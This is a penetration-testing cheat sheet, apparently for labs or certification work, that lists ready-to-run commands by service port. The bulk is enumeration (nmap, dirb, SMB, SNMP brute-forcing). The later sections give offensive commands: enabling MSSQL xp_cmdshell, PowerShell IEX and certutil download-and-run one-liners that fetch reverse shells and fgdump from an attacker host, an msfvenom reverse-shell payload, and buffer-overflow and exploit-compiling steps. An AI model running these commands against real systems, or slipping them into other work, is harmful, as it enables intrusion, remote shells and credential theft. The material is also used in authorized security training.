Notes

Nmap Enumeration
================
nmap -sC -sV -oA nmap_scan 10.10.10.1
nmap -p- 10.10.10.1 (for nmap -p- , --max-retries to set to 0 if you want a faster scan.)
nmap -sU 10.10.10.1
nmap --script=*smb*.nse -p 139,445 10.10.10.1


Port 21 - FTP
=============
ftp 192.168.1.1
passive (to ls files/directory)
binary
get index.html
put index.html
nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1


Port 25 - SMTP
==============
nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1
nc -nv 192.168.1.1 25
telnet 192.168.1.1 25


Port 53 - DNS
=============
dig axfr example.earth @ns1.test.com


Port 79 - Finger
================
finger 192.168.1.1


Port 80 or 443 - HTTP
========================
nikto -h 192.168.1.1
dirb http://192.168.1.1
dirb http://10.10.10.1/ /usr/share/wordlists/dirb/common.txt
dirb http://10.10.10.1/ /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u http://192.168.1.1/ -w /usr/share/wordlists/dirbuster/common.txt
wpscan --rua -e --url http://192.168.1.1
droopescan scan -u http://192.168.1.1
/robots.txt
/sites.xml
davtest -url http://192.168.1.1


Port 110 - POP3
===============
nc -nv 192.168.1.1 110
telnet 192.168.1.1 110
USER admin
PASS password
LIST
RETR 1
QUIT


Port 161 - SNMP
===============
./onesixtyone
nmap -sU  192.168.1.1 -p161 --script=snmp-brute  -Pn --script-args snmp-brute.communitiesdb=list.txt
snmp-check 192.168.1.1 -c public


Port 139,445 - SMB
==================
smbmap -H 192.168.1.1
smbclient //192.168.1.1/nt4wrksv
smbclient -L \\192.168.1.1
nmap --script smb-enum-shares -p 139,445 192.168.1.1


Port 2049 - NFS
===============
showmount -e 192.1.1.1
mount -t nfs 192.1.1.1:/site_backups /mnt/mountpoint (cd to /mnt/mountpoint for the shares)


Port 1433 - MSSQL
=================
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 192.168.1.1
EXEC sp_configure 'show advanced options', 1;
GO
Reconfigure;
GO
EXEC sp_configure 'xp_cmdshell', 1;
GO
Reconfigure;
GO


Port 3306 - MYSQL
=================
nmap -sV -Pn -vv -script=mysql* 192.168.1.1 -p 3306


Port 1521 - Oracle
==================
tnscmd10g version -h 192.168.1.1
tnscmd10g status -h 192.168.1.1


Port 111 - RPCbind
==================
rpcinfo –p 192.168.1.1


File Transfer Technique
=======================
Python SimpleHTTPServer (setup local web server)
python -m SimpleHTTPServer 80
python3 -m http.server

wget http://10.10.10.1/php-reverse-shell.php -o php-reverse-shell-copied.php

curl <URL> -o <OUT_FILE>

Powershell(Windows)
powershell.exe IEX (New-Object Net.WebClient).DownloadString(http://10.10.10.1/file.php)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.1/fgdump.exe', 'fgdump.exe')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.1/cmd.ps1', 'cmd.ps1')"
powershell -ExecutionPolicy Bypass -File c:\cmd.ps1

certutil -urlcache -split -f http://192.168.1.1/shell.exe


Buffer Overflow
===============
Pattern Create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

Pattern Offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 70423670

Msfvenom payload
msfvenom -p windows/shell_reverse_tcp lhost=10.10.10.1 lport=4444 -b "\x00\x04\x05\x35" -f c

Finding bad characters
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


Exploits compiling
==================
gcc -o exploit exploit.c (for 64 bits)
gcc -m32 -o exploit exploit.c (for 32 bits)
gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c (cross-compile)
